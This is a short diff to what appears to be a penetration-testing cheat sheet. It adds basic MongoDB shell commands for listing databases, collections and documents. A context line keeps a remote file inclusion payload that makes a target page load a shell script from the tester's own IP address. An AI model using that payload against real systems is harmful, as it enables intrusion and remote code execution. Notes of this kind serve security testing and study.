@@ -107,6 +107,18 @@
 - __In target `<url>/index.php?page=http://<your_ip>/shell.php`__
 
 
+## MangoDB
+```
+show dbs
+use <databasename>
+show collections ----> show tables
+db.banned.find().count() ---> total number of documents
+db.current.find() ---> retrieve all documents
+db.current.count()
+db.<dbname>.find() ---> to list out the documents
+
+```
+
 
 
 
